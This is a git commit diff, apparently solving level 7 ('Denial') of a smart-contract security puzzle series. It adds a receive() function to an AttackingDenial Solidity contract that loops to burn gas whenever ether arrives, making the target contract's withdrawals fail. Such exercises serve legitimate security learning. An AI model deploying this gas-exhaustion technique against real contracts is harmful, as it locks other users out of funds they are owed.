92aaefcbc89bc48691ca0cd2f4eb46fd6be7ff4a
Poof Young <poof@coding4kicks.com>
2022-04-01 21:49:15 -0700

    Solve level 7.

--- contracts/7. Denial/AttackingDenial.sol
+++ contracts/7. Denial/AttackingDenial.sol
@@ -4,10 +4,17 @@ import "./Denial.sol";
 
 contract AttackingDenial {
     address payable public contractAddress;
+    uint256 private awfulCounter = 0;
 
     constructor(address payable _contractAddress) {
         contractAddress = _contractAddress;
     }
 
     //Code me!
+    receive() external payable {
+        uint256 i;
+        for (i = 1; i < 100; i++) {
+            awfulCounter = i;
+        }
+    }
 }
